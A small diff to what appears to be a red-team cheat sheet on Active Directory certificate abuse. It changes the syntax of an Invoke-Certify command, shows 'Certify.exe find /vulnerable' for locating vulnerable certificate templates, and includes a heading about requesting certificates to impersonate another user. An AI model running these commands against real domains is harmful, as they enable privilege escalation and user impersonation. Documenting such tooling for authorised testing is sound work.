@@ -5,7 +5,7 @@ https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerShar
 ### get information about certificate environment and find vulnerable certificates (enrollment rights)
 ```
 Certify.exe find /vulnerable
-Invoke-Certify -c "find /vulnerable"
+Invoke-Certify find /vulnerable
 ```
 
 ### request certificate (altUser is the user to impersonate) - use /machine to switch into the current machine context
